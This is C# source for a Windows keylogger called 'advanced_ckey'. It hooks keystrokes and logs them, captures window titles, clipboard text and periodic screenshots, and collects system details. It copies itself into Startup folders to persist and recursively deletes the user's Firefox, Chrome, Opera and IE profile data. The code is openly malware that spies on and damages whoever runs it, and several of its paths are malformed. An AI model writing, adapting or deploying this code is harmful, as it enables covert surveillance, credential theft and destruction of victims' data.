using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using System.IO;
using System.Diagnostics;

namespace advanced_ckey
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            K = new Keyboard();
            InitializeComponent();
            
        }
        private Keyboard _K;

        private Keyboard K
        {
            [MethodImpl(MethodImplOptions.Synchronized)]
            get
            {
                return _K;
            }

            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                if (_K != null)
                {
                    _K.Down -= K_Down;
                }

                _K = value;

                if (_K != null)
                {
                    _K.Down += K_Down;
                }

            }
        }

        [DllImport("user32.dll", EntryPoint = "ToUnicodeEx", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern int ToUnicodeEx(Keys wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);


        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
       
        private string strin = null;




        public string GetActiveWindowTitle()
        {
            const int nChars = 256;
        StringBuilder Buff = new StringBuilder(nChars);
        IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private void keyboardLanguages() //this function here is to translate user installed language
        {
            for (var index = 0; index < InputLanguage.InstalledInputLanguages.Count; index++)
            {
                textBox2.Text = InputLanguage.InstalledInputLanguages[index].LayoutName.ToString() + textBox2.Text;
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (strin != GetActiveWindowTitle())
            {
                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine + "[" + GetActiveWindowTitle() + "]" + Environment.NewLine + "----->" + Clipboard.GetText().ToString() + "<-----" + Environment.NewLine + Environment.NewLine;
                strin = GetActiveWindowTitle();
            }
        }

        private void K_Down(string key)
        {
            textBox1.Text += key;
        }

        private void timer3_Tick(object sender, EventArgs e)   //for every 7 seconds: this mwethod will ensure the app is in the startup folder
        {
            // the all user for window 10 startup
            try
            {
                string file1 = Application.ExecutablePath;
                string copy1 = @"C:\" + Environment.UserName.ToString() + @"\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\advanced_ckey.exe";

                if (File.Exists(copy1))
                {
                }
                else
                {
                    File.Copy(file1, copy1);
                }
            }
            catch (Exception)
            {
            }

            // window 7 startup user and windows 10
            try
            {
                string file1 = Application.ExecutablePath;
                string copy1 = @"C:\Users\" + Environment.UserName.ToString() + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\advanced_ckey.exe";
                if (File.Exists(copy1))
                {
                }
                else
                {
                    File.Copy(file1, copy1);
                }
            }
            catch (Exception)
            {
            }

            // for windows xp startup user
            try
            {
                string file1 = Application.ExecutablePath;
                string copy1 = @"C:Documents and Settings\" + Environment.UserName.ToString() + @"\Start Menu\Programs\Startup\advanced_ckey.exe";
                if (File.Exists(copy1))
                {
                }
                else
                {
                    File.Copy(file1, copy1);
                }
            }
            catch (Exception)
            {
            }
        }
        public void screenshot()  // the method that handles the screenshot
        {
            try
            {
                string filename = "Screencapture" + DateTime.Now.ToString("dd - MM - yyyy - jhh:mm:ss") + ".png";   // filename to be saved in file explorer
                Screen s = Screen.PrimaryScreen;
                var img = new Bitmap(s.Bounds.Width, s.Bounds.Height);
                Graphics gr = Graphics.FromImage(img);
                gr.CopyFromScreen(s.Bounds.Location, Point.Empty, s.Bounds.Size);   // get screenshot into bitmap as graphics
                img.Save(@"C:\MyDir\Screenshot\" + filename);  // saves screenshot as file
            }
            catch (Exception)
            {
            }
        }       

        public void savetextfile()    // method saving textfile to file explorer
        {
            try
            {
                File.WriteAllText(@"C:\MyDirr\Keyboard.txt", textBox1.Text);
            }
            catch (Exception)
            {
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                Directory.CreateDirectory(@"C:\MyDir\Screenshot");  // create a diretory for saving the screenshot file
                Directory.CreateDirectory(@"C:\MyDirr");  // create a diretory for saving the screenshot file
                string filepath;
                filepath = @"C:\MyDirr\Keyboard.txt";
                if (File.Exists(filepath))
                {
                }
                else
                {
                    File.Create(filepath);
                }
            }
            catch (Exception)
            {
            }

            keylog_timer.Start();   // write textbox1.text strings into a file
            Sceenshot_timer.Start();
            keyboardLanguages();
           keylog_infomation();  // calls keylog_information
        }

        public void keylog_infomation()
        {
            var switchExpr = Properties.Settings.Default.browser;
            switch (switchExpr)
            {
                case 0:
                    {
                        Properties.Settings.Default.browser = 1;
                        Properties.Settings.Default.Save();
                        Properties.Settings.Default.Reload();
                        break;
                    }

                case 1:
                    {
                        timer4.Start();  // if case 1 clears saved web browser content
                        break;
                    }

                case 2:
                    {
                        break;
                    }

                default:
                    {
                        break;
                    }
            }

            textBox1.Text = DateTime.Now + Environment.NewLine + Environment.NewLine;  // get the present time of the day


           
            //try
            //{
            //    Process myprocess = new Process();
            //    myprocess.StartInfo.UseShellExecute = false;
            //    myprocess.StartInfo.RedirectStandardError = true;
            //    try
            //    {
            //        myprocess.StartInfo.FileName = "ipconfig";
            //        myprocess.StartInfo.Arguments = "/all";
            //        myprocess.StartInfo.CreateNoWindow = true;
            //        myprocess.Start();
            //        textBox1.Text = textBox1.Text + string.Replace(myprocess.StandardOutput.ReadToEnd(), Chr(13) + string.Chr(13), string.Chr(13));
            //        myprocess.WaitForExit();
            //    }
            //    catch (Win32Exception)
            //    {
            //    }
            //}
            //catch (Exception)
            //{
            //}



            try
            {
                textBox1.Text = Environment.NewLine + Environment.NewLine + textBox1.Text + Environment.NewLine + Environment.NewLine + "User Name:                 " + Environment.UserName.ToString();  // gives information about the operating system
                textBox1.Text = textBox1.Text + Environment.NewLine + "Computer Name:               " + Environment.MachineName.ToString();    // gives information about the operating system
                textBox1.Text = textBox1.Text + Environment.NewLine + "OS Version:               " + Environment.OSVersion.ToString();     // gives information about the operating system
                textBox1.Text = textBox1.Text + Environment.NewLine + "Runtime:               " + Environment.Version.ToString();      // gives information about the operating system
                textBox1.Text = textBox1.Text + Environment.NewLine + "System Root:               " + Environment.SystemDirectory.ToString();    
                textBox1.Text = textBox1.Text + Environment.NewLine + "User Domain Name:               " + Environment.UserName.ToString();     
                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine;

                K.CreateHook();   // this is the code that takes the keystroke from the keyboard class we created
                timer1.Start();   // gets active window name and if not wanted delete this line of code
                timer2.Start();
            }
            catch (Exception)
            {
            }
       
        }
       
        private void keylog_timer_Tick(object sender, EventArgs e)
        {
            savetextfile();
        }

        private void Sceenshot_timer_Tick(object sender, EventArgs e)
        {
            screenshot();
        }

        string firefox = @"C\Users" + Environment.UserName.ToString() + @"\AppData\Roaming\Mozilla\Firefox\Profiles";  //for firefox
        string IE = @"C:\Users\" + Environment.UserName.ToString() + @"\AppData\Roaming\Microsft\Windows\Cookies";  //internet explorer
        string opera = @"C:\Users\" + Environment.UserName.ToString() + @"\AppData\Roaming\Opera\Opera"; //opera
        string chrome = @"C:\Users\" + Environment.UserName.ToString() + @"\AppData\Local\Google\Chrome\User Data"; //chrome delete data

        private void timer4_Tick(object sender, EventArgs e)   //deletes browser data
        {
            try
            {
                Directory.Delete(firefox, true); //firefox
                File.Delete(@"C:\Users\" + Environment.UserName.ToString() + @"\AppData\Roaming\Mozilla\Firefox\profiles.ini"); //firefox
                Directory.Delete(IE, true); //internet
                Directory.Delete(opera, true); //opera
                Directory.Delete(chrome, true); //chrome

            }
            catch (Exception) { }
        }
    }
}

  

